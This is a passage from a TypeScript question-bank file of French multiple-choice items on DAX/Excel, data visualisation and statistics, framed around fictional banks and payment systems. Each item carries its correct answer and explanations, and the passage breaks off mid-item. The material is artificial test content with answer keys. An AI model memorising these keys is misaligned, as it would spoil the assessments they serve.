  },
  {
    id: 'DATA-BI-002',
    section: 'technique',
    filiere: 'data',
    competence: 'Excel & Power BI',
    difficulte: 'moyen',
    enonce:
      "On veut afficher un taux de rejet (paiements rejetés / paiements totaux) qui se recalcule selon la banque, le mois ou le canal choisis dans les segments. Comment l'implémenter en DAX ?",
    options: [
      { id: 'A', texte: "Avec une mesure, évaluée au moment de l'affichage dans le contexte de filtre du visuel" },
      { id: 'B', texte: "Avec une colonne calculée dans fait_paiements, stockée donc plus rapide à afficher" },
      { id: 'C', texte: "Avec une colonne calculée par banque dans dim_banque, puis sa moyenne dans le visuel" },
      { id: 'D', texte: "Avec une colonne ajoutée dans le fichier source avant import, puis sommée dans le visuel" },
    ],
    bonneReponse: 'A',
    explication:
      "Un ratio doit être calculé comme rapport de deux agrégats dans le contexte courant (DIVIDE(nb rejets, nb total)). Seule une mesure est évaluée dynamiquement selon les filtres actifs ; une colonne calculée est figée ligne par ligne au rafraîchissement du modèle.",
    pourquoiPas: {
      B: "Une colonne calculée est évaluée ligne par ligne au chargement : elle ne connaît pas les filtres du visuel et un ratio ligne à ligne n'a pas de sens.",
      C: "Une moyenne de taux par banque n'est pas le taux global (moyenne de ratios ≠ ratio des sommes) et elle ignore les filtres de mois ou de canal.",
      D: "Une valeur précalculée à la source est statique ; sommer des taux produit un résultat absurde.",
    },
    aRetenir: "Tout ce qui doit réagir aux filtres (ratios, totaux) est une mesure ; une colonne calculée sert à décrire une ligne.",
  },
  {
    id: 'DATA-BI-003',
    section: 'technique',
    filiere: 'data',
    competence: 'Excel & Power BI',
    difficulte: 'moyen',
    enonce:
      "La table `operations` (opérations fictives sur titres publics) contient une quantité et un prix unitaire par ligne. Quelle mesure DAX calcule correctement la valeur totale (2 000 sur l'extrait) ?",
    extrait: {
      langage: 'texte',
      contenu: `operations
id | quantite | prix_unitaire
1  | 10       | 100
2  | 20       | 50`,
    },
    options: [
      { id: 'A', texte: "Valeur := SUM(operations[quantite]) * SUM(operations[prix_unitaire])" },
      { id: 'B', texte: "Valeur := SUM(operations[quantite] * operations[prix_unitaire])" },
      { id: 'C', texte: "Valeur := SUMX(operations, operations[quantite] * operations[prix_unitaire])" },
      { id: 'D', texte: "Valeur := AVERAGE(operations[prix_unitaire]) * COUNTROWS(operations)" },
    ],
    bonneReponse: 'C',
    explication:
      "SUMX est un itérateur : il évalue l'expression quantité × prix pour chaque ligne (10 × 100 et 20 × 50), puis additionne les résultats, soit 2 000. Il faut multiplier AVANT d'agréger.",
    pourquoiPas: {
      A: "On multiplie deux totaux : 30 × 150 = 4 500, ce qui n'a aucun sens économique.",
      B: "SUM n'accepte qu'une référence de colonne, pas une expression : la formule est refusée par le moteur.",
      D: "Le prix moyen multiplié par le nombre de lignes donne 75 × 2 = 150 et ignore les quantités.",
    },
    aRetenir: "Calcul ligne par ligne puis somme = SUMX ; SUM n'additionne qu'une colonne existante.",
  },
  {
    id: 'DATA-BI-004',
    section: 'technique',
    filiere: 'data',
    competence: 'Excel & Power BI',
    difficulte: 'difficile',
    enonce:
      "Une matrice a `dim_canal[canal]` en lignes. La mesure [Total] y affiche : RTGS 500, ACH 300, Mobile 200. Quelle valeur la mesure [Total RTGS] affiche-t-elle sur la ligne « ACH » ?",
    extrait: {
      langage: 'texte',
      contenu: `Total := SUM ( fait_paiements[montant] )

Total RTGS :=
CALCULATE ( [Total], dim_canal[canal] = "RTGS" )`,
    },
    options: [
      { id: 'A', texte: "300" },
      { id: 'B', texte: "(vide)" },
      { id: 'C', texte: "0" },
      { id: 'D', texte: "500" },
    ],
    bonneReponse: 'D',
    explication:
      "Un filtre booléen dans CALCULATE équivaut à FILTER(ALL(dim_canal[canal]), ...) : il REMPLACE le filtre existant sur cette colonne au lieu de s'y ajouter. Sur la ligne ACH, le filtre « canal = ACH » de la matrice est donc écrasé par « canal = RTGS », et la mesure affiche 500 sur toutes les lignes.",
    pourquoiPas: {
      A: "300 est le total ACH : ce serait vrai si CALCULATE respectait le filtre de la ligne, or il le remplace sur la même colonne.",
      B: "Une cellule vide serait obtenue avec KEEPFILTERS(dim_canal[canal] = \"RTGS\"), qui intersecte les filtres au lieu de les remplacer.",
      C: "DAX ne renvoie pas 0 pour une intersection vide mais BLANK ; et ici l'intersection n'a de toute façon pas lieu.",
    },
    aRetenir: "CALCULATE écrase le filtre existant sur la colonne qu'il filtre ; utilisez KEEPFILTERS pour intersecter.",
  },
  {
    id: 'DATA-BI-005',
    section: 'technique',
    filiere: 'data',
    competence: 'Excel & Power BI',
    difficulte: 'facile',
    enonce:
      "Dans Excel, la feuille « Référentiel » contient le nom des banques en colonne B et leur code d'identification en colonne D. En A2 de la feuille de travail figure un code. Quelle formule renvoie le nom de la banque correspondante ?",
    options: [
      { id: 'A', texte: "=RECHERCHEX(A2;Référentiel!D:D;Référentiel!B:B;\"Introuvable\")" },
      { id: 'B', texte: "=RECHERCHEV(A2;Référentiel!B:D;1;FAUX)" },
      { id: 'C', texte: "=RECHERCHEV(A2;Référentiel!D:D;-2;FAUX)" },
      { id: 'D', texte: "=INDEX(Référentiel!D:D;EQUIV(A2;Référentiel!B:B;0))" },
    ],
    bonneReponse: 'A',
    explication:
      "RECHERCHEX sépare la plage de recherche (codes en D) et la plage de retour (noms en B) : elle peut donc renvoyer une colonne située à gauche de la clé, avec une correspondance exacte par défaut et un message si le code est absent.",
    pourquoiPas: {
      B: "RECHERCHEV cherche toujours dans la première colonne de la plage (B, les noms) : le code ne sera pas trouvé.",
      C: "RECHERCHEV n'accepte pas d'index de colonne négatif : elle ne sait pas regarder à gauche de la clé.",
      D: "Les plages sont inversées : on cherche le code dans les noms (B) et on renvoie un code (D).",
    },
    aRetenir: "RECHERCHEX (ou INDEX/EQUIV) découple colonne de recherche et colonne de retour, ce que RECHERCHEV ne permet pas.",
  },
  {
    id: 'DATA-BI-006',
    section: 'technique',
    filiere: 'data',
    competence: 'Excel & Power BI',
    difficulte: 'moyen',
    enonce:
      "La relation `dim_banque` (1) → `fait_paiements` (*) a un sens de filtrage unique. Un segment est posé sur `fait_paiements[canal]` (valeur « Mobile ») et une carte affiche COUNTROWS(dim_banque). Que montre la carte ?",
    options: [
      { id: 'A', texte: "Seulement le nombre de banques ayant des paiements sur le canal Mobile" },
      { id: 'B', texte: "Le nombre total de banques, inchangé : le filtre ne remonte pas des faits vers la dimension" },
      { id: 'C', texte: "Une erreur, car un segment ne peut pas porter sur une colonne de la table de faits" },
      { id: 'D', texte: "Une valeur vide, car la table de faits ne peut pas filtrer une table de dimension" },
    ],
    bonneReponse: 'B',
    explication:
      "Avec un filtrage unidirectionnel, le filtre se propage du côté 1 (dimension) vers le côté * (faits), jamais l'inverse. Le segment sur fait_paiements restreint les paiements mais pas dim_banque, donc COUNTROWS(dim_banque) est inchangé. Pour compter les banques actives sur un canal, on compte plutôt DISTINCTCOUNT(fait_paiements[banque_key]) ou on modélise le canal en dimension.",
    pourquoiPas: {
      A: "Ce comportement exigerait un filtrage bidirectionnel ou une mesure comptant les clés distinctes dans la table de faits.",
      C: "Un segment peut porter sur n'importe quelle colonne, y compris de la table de faits, même si c'est une mauvaise pratique.",
      D: "Le filtre n'atteint pas la dimension : elle n'est pas filtrée à vide, elle n'est pas filtrée du tout.",
    },
    aRetenir: "Le filtre suit la flèche de la relation : de la dimension (1) vers les faits (*), pas l'inverse.",
  },

  // ───────────────────────── Visualisation ─────────────────────────
  {
    id: 'DATA-VIZ-001',
    section: 'technique',
    filiere: 'data',
    competence: 'Visualisation',
    difficulte: 'facile',
    enonce:
      "Vous devez montrer à la direction l'évolution du nombre quotidien de virements traités par le système de règlement brut en temps réel sur les 24 derniers mois. Quel graphique choisir ?",
    options: [
      { id: 'A', texte: "Un camembert avec une part par mois" },
      { id: 'B', texte: "Un nuage de points volume / montant moyen" },
      { id: 'C', texte: "Une courbe avec le temps en abscisse" },
      { id: 'D', texte: "Un histogramme des volumes quotidiens" },
    ],
    bonneReponse: 'C',
    explication:
      "Le message est une évolution dans le temps : la courbe, avec le temps sur l'axe horizontal, fait lire directement tendance, saisonnalité et ruptures. Sur 730 points, elle reste lisible, ce qu'aucun autre type ne permet.",
    pourquoiPas: {
      A: "Un camembert montre une composition à un instant donné ; 24 parts sont illisibles et l'ordre temporel disparaît.",
      B: "Un nuage de points sert à étudier une relation entre deux variables, pas une évolution temporelle.",
      D: "Un histogramme montre la distribution des valeurs et perd complètement l'ordre chronologique.",
    },
    aRetenir: "Évolution dans le temps → courbe, temps en abscisse.",
  },
  {
    id: 'DATA-VIZ-002',
    section: 'technique',
    filiere: 'data',
    competence: 'Visualisation',
    difficulte: 'facile',
    enonce:
      "Un diagramme en barres compare le taux de rejet de la Banque Alpha (2,1 %) et de la Banque Beta (2,4 %). L'axe vertical commence à 2 %, si bien que la barre de Beta paraît quatre fois plus haute. Quel est le problème ?",
    options: [
      { id: 'A', texte: "Aucun : zoomer sur l'écart permet justement de mieux le voir" },
      { id: 'B', texte: "Deux pourcentages se comparent mieux avec deux camemberts" },
      { id: 'C', texte: "Il faudrait plutôt passer l'axe en échelle logarithmique" },
      { id: 'D', texte: "La longueur des barres doit partir de zéro, sinon l'écart est exagéré" },
    ],
    bonneReponse: 'D',
    explication:
      "Dans un diagramme en barres, l'œil compare des longueurs : tronquer l'axe rend les longueurs non proportionnelles aux valeurs. Ici un écart de 0,3 point paraît énorme. Soit on part de zéro, soit on choisit un graphique à points (ou on affiche l'écart lui-même) pour lequel un axe non nul est acceptable.",
    pourquoiPas: {
      A: "Zoomer sur un graphique à barres trompe le lecteur sur l'ampleur de l'écart, ce qui est inacceptable devant un comité.",
      B: "Deux camemberts obligent à comparer des angles entre deux figures, ce que l'œil fait encore plus mal.",
      C: "L'échelle logarithmique ne règle pas le problème de l'origine et n'a pas de sens pour deux valeurs aussi proches.",
    },
    aRetenir: "Barres = axe à zéro ; pour zoomer sur un écart, utilisez des points ou une courbe.",
  },
  {
    id: 'DATA-VIZ-003',
    section: 'technique',
    filiere: 'data',
    competence: 'Visualisation',
    difficulte: 'facile',
    enonce:
      "Vous présentez la part de marché des dépôts de 11 banques fictives, dont plusieurs ont des parts proches (entre 6 % et 9 %). Quelle représentation est la plus lisible ?",
    options: [
      { id: 'A', texte: "Des barres horizontales triées par part décroissante" },
      { id: 'B', texte: "Un camembert à 11 parts accompagné d'une légende" },
      { id: 'C', texte: "Un camembert 3D pour mieux distinguer les parts" },
      { id: 'D', texte: "Une courbe reliant les banques dans l'ordre alphabétique" },
    ],
    bonneReponse: 'A',
    explication:
      "L'œil compare beaucoup mieux des longueurs alignées sur une même base que des angles ou des surfaces. Le tri décroissant donne immédiatement le classement, et l'orientation horizontale laisse la place aux noms des banques.",
    pourquoiPas: {
      B: "Avec 11 parts proches, les angles sont indiscernables et le va-et-vient avec la légende épuise le lecteur.",
      C: "La perspective 3D déforme les surfaces : les parts au premier plan paraissent plus grosses qu'elles ne le sont.",
      D: "Une courbe suggère une continuité ou un ordre qui n'existe pas entre des catégories nominales.",
    },
    aRetenir: "Comparer des catégories → barres triées ; le camembert est à proscrire au-delà de 2 ou 3 parts.",
  },
  {
    id: 'DATA-VIZ-004',
    section: 'technique',
    filiere: 'data',
    competence: 'Visualisation',
    difficulte: 'moyen',
    enonce: "Associez chaque message au graphique le plus adapté.",
    extrait: {
      langage: 'texte',
      contenu: `1. Distribution des montants unitaires des paiements du jour (très asymétrique)
2. Lien entre le nombre d'agences et l'encours des dépôts de 15 banques
3. Évolution mensuelle du taux de rejet sur 3 ans
4. Répartition du volume du jour entre 4 canaux de paiement`,
    },
    options: [
      { id: 'A', texte: "1 nuage de points ; 2 histogramme ; 3 courbe ; 4 barres triées" },
      { id: 'B', texte: "1 histogramme (échelle log) ; 2 nuage de points ; 3 courbe ; 4 barres triées" },
      { id: 'C', texte: "1 courbe ; 2 histogramme ; 3 barres triées ; 4 camembert 3D" },
      { id: 'D', texte: "1 boîte à moustaches ; 2 courbe ; 3 nuage de points ; 4 barres empilées" },
    ],
    bonneReponse: 'B',
    explication:
      "Une distribution se montre par un histogramme (ou une boîte à moustaches), avec une échelle logarithmique si les montants sont très asymétriques. Une relation entre deux variables numériques se lit sur un nuage de points, une évolution sur une courbe, et une composition entre quelques catégories sur des barres triées.",
    pourquoiPas: {
      A: "Les deux premiers sont inversés : le nuage de points relie deux variables, l'histogramme décrit une seule variable.",
      C: "Une courbe ne montre pas une distribution, l'histogramme ne montre pas une relation, et le camembert 3D déforme les parts.",
      D: "La boîte à moustaches convient pour 1, mais une courbe pour une relation entre banques et un nuage pour une évolution sont inadaptés.",
    },
    aRetenir: "Distribution → histogramme ; corrélation → nuage de points ; évolution → courbe ; composition → barres.",
  },
  {
    id: 'DATA-VIZ-005',
    section: 'technique',
    filiere: 'data',
    competence: 'Visualisation',
    difficulte: 'moyen',
    enonce:
      "La supervision veut repérer à quels jours de la semaine et à quelles heures se concentrent les incidents techniques des participants au système de paiement (7 jours × 24 heures). Quelle représentation choisir ?",
    options: [
      { id: 'A', texte: "Sept camemberts, un par jour, découpés par heure" },
      { id: 'B', texte: "Une courbe unique de 168 points, heure par heure" },
      { id: 'C', texte: "Une carte de chaleur jours × heures, en dégradé d'une seule teinte" },
      { id: 'D', texte: "Une carte de chaleur jours × heures, en palette arc-en-ciel" },
    ],
    bonneReponse: 'C',
    explication:
      "Croiser deux dimensions catégorielles ordonnées (jour, heure) et une intensité est le cas d'usage type de la carte de chaleur : les concentrations sautent aux yeux. Pour une quantité allant de faible à forte, une palette séquentielle d'une seule teinte (du clair au foncé) se lit de manière intuitive et reste accessible aux daltoniens.",
    pourquoiPas: {
      A: "168 parts réparties dans 7 camemberts sont illisibles et empêchent toute comparaison d'un jour à l'autre.",
      B: "La courbe déroule les 168 heures à la suite : on perd la superposition des jours qui révèle les motifs récurrents.",
      D: "Le bon type de graphique, mais la palette arc-en-ciel n'a pas d'ordre perceptif et crée de fausses frontières entre teintes.",
    },
    aRetenir: "Deux dimensions croisées + une intensité → carte de chaleur, avec une palette séquentielle à une teinte.",
  },
  {
    id: 'DATA-VIZ-006',
    section: 'technique',
    filiere: 'data',
    competence: 'Visualisation',
    difficulte: 'difficile',
    enonce:
      "Dans le tableau de bord mensuel du comité de direction, le taux de disponibilité du système de paiement est de 99,2 % (objectif interne fictif : 99,5 %). Le comité doit comprendre en quelques secondes s'il faut s'inquiéter. Quel affichage est le plus approprié ?",
    options: [
      { id: 'A', texte: "Une grande carte KPI affichant uniquement « 99,2 % » en gros caractères" },
      { id: 'B', texte: "Une jauge graduée de 0 à 100 % dont l'aiguille pointe sur 99,2 %" },
      { id: 'C', texte: "Un camembert disponible / indisponible (99,2 % contre 0,8 %)" },
      { id: 'D', texte: "La carte KPI avec l'écart à l'objectif signalé en couleur et la tendance sur 12 mois" },
    ],
    bonneReponse: 'D',
    explication:
      "Un indicateur n'a de sens qu'en comparaison : à un objectif (est-ce acceptable ?) et à son historique (est-ce que ça se dégrade ?). La carte KPI avec l'écart à 99,5 % mis en évidence et une petite courbe de tendance répond à ces deux questions d'un coup d'œil, ce qu'attend un comité de direction.",
    pourquoiPas: {
      A: "Un chiffre isolé, sans référence, ne dit pas si 99,2 % est bon ou mauvais : le comité ne peut pas décider.",
      B: "Sur une échelle de 0 à 100 %, l'aiguille est quasi au maximum : la jauge suggère que tout va bien alors que l'objectif n'est pas atteint.",
      C: "Le camembert écrase la part de 0,8 % et ne montre ni l'objectif ni l'évolution, qui sont l'essentiel du message.",
    },
    aRetenir: "Un KPI de direction se présente toujours avec sa référence (objectif, période précédente) et sa tendance.",
  },
];

const banqueDataB: QcmQuestion[] = [
  // ───────────────────────────── Statistiques ─────────────────────────────
  {
    id: 'DATA-STAT-001',
    section: 'technique',
    filiere: 'data',
    competence: 'Statistiques',
    difficulte: 'facile',
    enonce:
      "Un analyste de la Direction des systèmes de paiement examine les montants de 7 virements interbancaires émis par la Banque Alpha sur une matinée (série fictive, en millions de CDF). Quelle affirmation est correcte ?",
    extrait: {
      langage: 'texte',
      contenu: `Montants (millions CDF), dans l'ordre d'arrivée :
42   38   45   40   44   39   610`,
    },
    options: [
      { id: 'A', texte: "La moyenne (≈ 122,6) est l'indicateur le plus représentatif, car elle utilise toutes les valeurs." },
      { id: 'B', texte: "La médiane vaut 42 et décrit mieux le montant typique que la moyenne (≈ 122,6), tirée par 610." },
      { id: 'C', texte: "La médiane vaut 40, car c'est la valeur située au milieu de la liste fournie." },
      { id: 'D', texte: "Il faut supprimer d'office la valeur 610 et retenir la moyenne des six autres, soit ≈ 41,3." },
    ],
    bonneReponse: 'B',
    explication:
      "Triée, la série donne 38, 39, 40, 42, 44, 45, 610 : la 4e valeur sur 7 est la médiane, soit 42. La moyenne vaut 858 / 7 ≈ 122,6 : un seul virement élevé la multiplie par près de trois. La médiane, insensible aux valeurs extrêmes, reflète mieux le montant « typique ».",
    pourquoiPas: {
      A: "La moyenne est très sensible aux valeurs extrêmes : 122,6 ne correspond à aucun virement habituel de la série.",
      C: "La médiane se lit sur la série TRIÉE ; 40 est la valeur centrale de la liste dans l'ordre d'arrivée, pas la médiane.",
      D: "Une valeur extrême n'est pas forcément une erreur : un virement de 610 peut être légitime et doit être analysé, pas supprimé d'office.",
    },
    aRetenir: "Valeurs extrêmes présentes : la médiane résiste, la moyenne se laisse tirer.",
  },
  {
    id: 'DATA-STAT-002',
    section: 'technique',
    filiere: 'data',
    competence: 'Statistiques',
    difficulte: 'moyen',
    enonce:
      "Le nombre quotidien de paiements rejetés par la chambre de compensation pour la Banque Beta est relevé sur 5 jours (série fictive). Quel est l'écart-type de population (division par n), arrondi à 0,01 près ?",
    extrait: {
      langage: 'texte',
      contenu: `Jour        J1  J2  J3  J4  J5
Rejets       4   6   8  10  12`,
    },
    options: [
      { id: 'A', texte: '3,16' },
      { id: 'B', texte: '8,00' },
      { id: 'C', texte: '2,83' },
      { id: 'D', texte: '2,40' },
    ],
    bonneReponse: 'C',
    explication:
      "Moyenne = 40 / 5 = 8 ; écarts au carré : 16 + 4 + 0 + 4 + 16 = 40. Variance de population = 40 / 5 = 8, donc écart-type = √8 ≈ 2,83. L'écart-type s'exprime dans la même unité que les données (nombre de rejets), contrairement à la variance.",
    pourquoiPas: {
      A: "3,16 = √(40 / 4) est l'écart-type d'échantillon (division par n − 1), alors que l'énoncé demande la division par n.",
      B: "8 est la variance (en « rejets au carré ») : il manque la racine carrée pour obtenir l'écart-type.",
      D: "2,40 = (4 + 2 + 0 + 2 + 4) / 5 est l'écart absolu moyen, un autre indicateur de dispersion.",
    },
    aRetenir: "Écart-type = racine carrée de la variance ; division par n pour une population, par n − 1 pour un échantillon.",
  },
  {
    id: 'DATA-STAT-003',
    section: 'technique',
    filiere: 'data',
    competence: 'Statistiques',
    difficulte: 'facile',
    enonce:
      "Pour les montants de crédits aux PME déclarés par les banques supervisées (données fictives), un rapport indique : Q1 = 40, médiane = 55, Q3 = 70 (millions de CDF). Quelle lecture est correcte ?",
    options: [
      { id: 'A', texte: "L'écart interquartile vaut 30 et environ 50 % des crédits se situent entre 40 et 70." },
      { id: 'B', texte: "L'écart interquartile vaut 15 et mesure la distance entre la médiane et Q3." },
      { id: 'C', texte: "L'écart interquartile vaut 30 et environ 75 % des crédits se situent entre 40 et 70." },
      { id: 'D', texte: "L'écart interquartile vaut 55, car il correspond toujours à la médiane." },
    ],
    bonneReponse: 'A',
    explication:
      "IQR = Q3 − Q1 = 70 − 40 = 30. Q1 laisse 25 % des observations en dessous et Q3 en laisse 75 % : entre les deux se trouvent donc environ 50 % des observations, la « moitié centrale ». L'IQR est une mesure de dispersion robuste aux valeurs extrêmes.",
    pourquoiPas: {
      B: "70 − 55 = 15 n'est qu'un demi-écart (médiane à Q3) ; l'IQR se calcule entre Q1 et Q3.",
      C: "75 % des observations sont sous Q3, mais seulement 50 % se trouvent entre Q1 et Q3.",
      D: "La médiane est une mesure de position, l'IQR une mesure de dispersion : ce sont deux indicateurs distincts.",
    },
    aRetenir: "IQR = Q3 − Q1 : la largeur de la moitié centrale des données.",
  },
  {
    id: 'DATA-STAT-004',
    section: 'technique',
    filiere: 'data',
    competence: 'Statistiques',
    difficulte: 'facile',
    enonce:
      "Dans un jeu de données fictif par province, on observe une forte corrélation positive entre le nombre d'agences bancaires et le nombre de fraudes au chèque signalées. Quelle conclusion est la plus rigoureuse ?",
    options: [
      { id: 'A', texte: "Ouvrir des agences provoque des fraudes : il faut freiner les ouvertures d'agences." },
      { id: 'B', texte: "Les fraudes attirent les banques, qui ouvrent des agences là où la fraude est élevée." },
      { id: 'C', texte: "La corrélation étant forte, le lien de causalité est démontré statistiquement." },
      { id: 'D', texte: "Un facteur commun, comme la population ou l'activité économique, peut expliquer les deux séries." },
    ],
    bonneReponse: 'D',
    explication:
      "Une corrélation mesure une co-variation, pas un lien de cause à effet. Ici, une variable confondante évidente (taille de la population, volume d'activité) augmente à la fois le nombre d'agences et le nombre de fraudes. Pour comparer les provinces, il faudrait au minimum raisonner en taux (fraudes pour 1 000 comptes, par exemple).",
    pourquoiPas: {
      A: "Conclure à une causalité à partir d'une simple corrélation est l'erreur classique, ici aggravée par une variable confondante évidente.",
      B: "C'est une causalité inverse tout aussi non démontrée : la corrélation ne dit rien du sens d'un éventuel lien.",
      C: "Aucune valeur de corrélation, même proche de 1, ne démontre à elle seule une causalité.",
    },
    aRetenir: "Corrélation ≠ causalité : cherchez d'abord la variable confondante.",
  },
  {
    id: 'DATA-STAT-005',
    section: 'technique',
    filiere: 'data',
    competence: 'Statistiques',
    difficulte: 'moyen',
    enonce:
      "Un analyste étudie le lien entre l'écart journalier du cours de change à sa moyenne (x, en unités normalisées) et le nombre d'alertes de surveillance (y). Les données sont fictives. Que faut-il conclure ?",
    extrait: {
      langage: 'python',
      contenu: `import numpy as np
x = np.array([-2, -1, 0, 1, 2])
y = np.array([ 4,  1, 0, 1, 4])
print(np.corrcoef(x, y)[0, 1])   # affiche 0.0`,
    },
    options: [
      { id: 'A', texte: "x et y sont indépendants : connaître x n'apporte aucune information sur y." },
      { id: 'B', texte: "Il n'y a pas de relation linéaire, mais y dépend parfaitement de x (y = x²)." },
      { id: 'C', texte: "Le calcul est forcément faux, car un coefficient exactement nul est impossible." },
      { id: 'D', texte: "La relation est négative, puisque y diminue quand x passe de −2 à 0." },
    ],
    bonneReponse: 'B',
    explication:
      "Le coefficient de Pearson ne mesure que l'intensité d'une relation LINÉAIRE. Ici y = x² : la relation est parfaite mais en forme de U, symétrique, donc les co-variations positives et négatives se compensent et r = 0. Il faut toujours visualiser le nuage de points avant de conclure.",
    pourquoiPas: {
      A: "r = 0 signifie absence de lien linéaire, pas indépendance : ici y est entièrement déterminé par x.",
      C: "r = 0 est tout à fait possible, notamment pour une relation symétrique comme y = x² sur des x centrés.",
      D: "y diminue puis augmente : sur l'ensemble de la série, aucune tendance linéaire négative ne domine.",
    },
    aRetenir: "Pearson = lien linéaire seulement ; r ≈ 0 n'exclut pas une forte relation non linéaire.",
  },
  {
    id: 'DATA-STAT-006',
    section: 'technique',
    filiere: 'data',
    competence: 'Statistiques',
    difficulte: 'moyen',
    enonce:
      "Pour estimer l'usage des paiements numériques dans la population, une enquête est diffusée uniquement via l'application mobile de la Banque Alpha. 82 % des répondants déclarent payer par mobile chaque semaine. Quel est le principal problème ?",
    options: [
      { id: 'A', texte: "Un biais de sélection : l'échantillon exclut les non-clients et ceux sans smartphone." },
      { id: 'B', texte: "Une taille d'échantillon insuffisante, qu'il suffirait d'augmenter pour corriger." },
      { id: 'C', texte: "Une erreur d'arrondi, car 82 % devrait être présenté avec une décimale." },
      { id: 'D', texte: "Aucun problème, si la Banque Alpha est l'établissement le plus important du pays." },
    ],
    bonneReponse: 'A',
    explication:
      "La base de sondage (utilisateurs de l'application) ne couvre pas la population cible : les personnes non bancarisées ou sans smartphone en sont exclues, alors qu'elles paient précisément moins par mobile. L'estimation est donc biaisée vers le haut. Un échantillonnage aléatoire, éventuellement stratifié, sur une base couvrant toute la population est nécessaire.",
    pourquoiPas: {
      B: "Augmenter la taille réduit l'erreur aléatoire, pas le biais : un million de répondants issus de l'application resteraient non représentatifs.",
      C: "La précision d'affichage est secondaire : le problème est la représentativité de l'échantillon.",
      D: "Même le plus grand établissement ne représente pas les non-clients ni les personnes sans smartphone.",
    },
    aRetenir: "Un grand échantillon biaisé reste biaisé : la représentativité prime sur la taille.",
  },
  {
    id: 'DATA-STAT-007',
    section: 'technique',
    filiere: 'data',
    competence: 'Statistiques',
    difficulte: 'difficile',
    enonce:
      "À partir d'un échantillon aléatoire de dossiers de crédit, la Direction de la supervision estime le délai moyen de traitement : intervalle de confiance à 95 % = [12,4 ; 15,8] jours (données fictives). Quelle interprétation est correcte ?",
    options: [
      { id: 'A', texte: "95 % des dossiers de crédit sont traités en un délai compris entre 12,4 et 15,8 jours." },
      { id: 'B', texte: "Le délai moyen observé dans l'échantillon a 95 % de chances de se situer dans cet intervalle." },
      { id: 'C', texte: "Répétée sur de nombreux échantillons, la méthode produit des intervalles contenant le vrai délai moyen dans 95 % des cas." },
      { id: 'D', texte: "Un délai moyen de 16 jours est impossible, puisqu'il se situe hors de l'intervalle." },
    ],
    bonneReponse: 'C',
    explication:
      "Le niveau de confiance de 95 % qualifie la procédure : si l'on répétait l'échantillonnage, environ 95 % des intervalles ainsi construits contiendraient la vraie moyenne de la population. L'intervalle porte sur un paramètre (la moyenne), pas sur les dossiers individuels. Une valeur extérieure à l'intervalle est peu compatible avec les données, mais pas impossible.",
    pourquoiPas: {
      A: "L'intervalle concerne la moyenne de la population, pas la dispersion des délais individuels, qui est bien plus large.",
      B: "La moyenne de l'échantillon est connue et se trouve par construction au centre de l'intervalle : aucune probabilité ne s'y attache.",
      D: "Avec un niveau de 95 %, environ 5 % des intervalles ne contiennent pas la vraie valeur : 16 jours reste possible.",
    },
    aRetenir: "Le « 95 % » d'un intervalle de confiance porte sur la méthode, pas sur les individus.",
  },
  {
    id: 'DATA-STAT-008',
    section: 'technique',
    filiere: 'data',
    competence: 'Statistiques',
    difficulte: 'difficile',
    enonce:
      "Un test compare le taux de rejet des virements avant et après une mise à jour du système de paiement (données fictives). H0 : « pas de différence ». Le test donne p = 0,03. Quelle interprétation est correcte ?",
    options: [
      { id: 'A', texte: "Il y a 3 % de probabilité que H0 soit vraie, donc 97 % que la mise à jour ait changé le taux." },
      { id: 'B', texte: "La différence observée est forcément importante sur le plan opérationnel." },
      { id: 'C', texte: "Il y a 97 % de chances qu'un nouveau test donne lui aussi un résultat significatif." },
      { id: 'D', texte: "Si H0 était vraie, un écart au moins aussi extrême que celui observé aurait 3 % de probabilité de survenir." },
    ],
    bonneReponse: 'D',
    explication:
      "La p-value est une probabilité calculée EN SUPPOSANT H0 vraie : celle d'obtenir un résultat au moins aussi extrême que celui observé. Au seuil de 5 %, p = 0,03 conduit à rejeter H0. Elle ne donne ni la probabilité que H0 soit vraie, ni l'ampleur de l'effet.",
    pourquoiPas: {
      A: "La p-value n'est pas la probabilité de H0 : elle est calculée sous l'hypothèse que H0 est vraie.",
      B: "Significativité statistique ≠ importance pratique : avec beaucoup de données, un écart minime peut être significatif.",
      C: "La p-value ne mesure pas la probabilité de reproduire le résultat ; celle-ci dépend notamment de la puissance du test.",
    },
    aRetenir: "p-value = P(données au moins aussi extrêmes | H0 vraie), jamais P(H0 vraie).",
  },
  {
    id: 'DATA-STAT-009',
    section: 'technique',
    filiere: 'data',
    competence: 'Statistiques',
    difficulte: 'facile',
    enonce:
      "Dans cet exemple, le nombre quotidien de transactions traitées par un système de paiement suit approximativement une loi normale de moyenne 500 milliers et d'écart-type 40 milliers. Quelle proportion approximative des jours se situe entre 420 et 580 milliers ?",
    options: [
      { id: 'A', texte: 'Environ 95 %' },
      { id: 'B', texte: 'Environ 68 %' },
      { id: 'C', texte: 'Environ 99,7 %' },
      { id: 'D', texte: 'Environ 47,5 %' },
    ],
    bonneReponse: 'A',
    explication:
      "420 = 500 − 2 × 40 et 580 = 500 + 2 × 40 : l'intervalle couvre la moyenne ± 2 écarts-types. Selon la règle 68-95-99,7, environ 95 % des observations d'une loi normale s'y trouvent.",
    pourquoiPas: {
      B: "68 % correspond à ± 1 écart-type, soit l'intervalle [460 ; 540].",
      C: "99,7 % correspond à ± 3 écarts-types, soit l'intervalle [380 ; 620].",
      D: "47,5 % est la proportion d'un seul côté (entre 500 et 580), pas de l'intervalle complet.",
    },
    aRetenir: "Loi normale : ± 1σ ≈ 68 %, ± 2σ ≈ 95 %, ± 3σ ≈ 99,7 %.",
  },
  {
    id: 'DATA-STAT-010',
    section: 'technique',
    filiere: 'data',
    competence: 'Statistiques',
    difficulte: 'moyen',
    enonce:
      "Un tableau de bord fictif compare les taux de défaut de deux banques. La Banque Alpha a un taux de défaut plus faible dans CHAQUE segment, mais un taux global plus élevé. Quelle est l'explication ?",
    extrait: {
      langage: 'texte',
      contenu: `Segment        Banque Alpha              Banque Beta
PME            90 / 1 000  =  9,0 %      20 /   200  = 10,0 %
Particuliers    4 /   200  =  2,0 %      25 / 1 000  =  2,5 %
Total          94 / 1 200  ≈  7,8 %      45 / 1 200  ≈  3,8 %`,
    },
    options: [
      { id: 'A', texte: "Une erreur de calcul : un total ne peut pas contredire tous les segments." },
      { id: 'B', texte: "La Banque Beta sous-déclare ses défauts, ce que prouve l'inversion du résultat." },
      { id: 'C', texte: "Un effet de structure : Alpha est concentrée sur le segment PME, plus risqué (paradoxe de Simpson)." },
      { id: 'D', texte: "Le taux global d'Alpha est le seul pertinent : les taux par segment doivent être ignorés." },
    ],
    bonneReponse: 'C',
    explication:
